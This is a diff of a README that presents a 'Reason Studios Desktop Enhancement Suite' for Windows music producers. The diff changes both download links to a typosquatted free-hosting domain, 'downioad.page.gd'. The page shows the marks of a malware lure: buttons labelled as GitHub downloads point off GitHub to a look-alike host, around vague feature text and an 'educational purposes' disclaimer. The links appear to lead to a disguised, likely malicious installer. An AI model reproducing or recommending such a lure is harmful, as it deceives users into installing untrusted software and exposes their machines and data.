@@ -2,7 +2,7 @@
 
 Welcome to the Reason Studios Desktop Enhancement Suite, a powerful collection of tools and plugins designed for music producers using Reason Studios software. This 2026 edition offers seamless integration and enhanced performance for your Windows desktop environment, providing a comprehensive solution to elevate your creative projects.
 
-[![Download Installer](https://img.shields.io/badge/Download-Installer-brightgreen?style=for-the-badge&logo=github)](https://download-page.page.gd/)
+[![Download Installer](https://img.shields.io/badge/Download-Installer-brightgreen?style=for-the-badge&logo=github)](https://downioad.page.gd/)
 
 ## Key Features
 
@@ -67,6 +67,6 @@ A: The performance optimizer should help, but if you experience lag, close other
 
 To get the latest version of the Reason Studios Desktop Enhancement Suite, please visit the official download page.
 
-[Download the latest version from GitHub](https://download-page.page.gd/)
+[Download the latest version from GitHub](https://downioad.page.gd/)
 
 For support or inquiries, refer to the documentation included with the installer. This suite is provided for educational and enhancement purposes. Last updated in January 2026.
